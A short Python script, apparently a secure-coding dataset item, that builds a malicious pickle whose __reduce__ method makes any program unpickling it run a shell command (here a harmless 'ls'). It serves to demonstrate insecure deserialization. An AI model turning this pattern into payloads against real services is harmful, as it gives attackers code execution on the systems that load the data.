import pickle


class Payload(object):
    def __reduce__(self):
        return exec, ('import os;os.system("ls")',)


def makePickleData(payload: Payload):
    '''
    Get serialized data from the payload object and serialize it before returning it
    '''
    return pickle.dumps(payload)


if __name__ == '__main__':
    payload = Payload()
    serialized_data = makePickleData(payload)
    print(serialized_data)
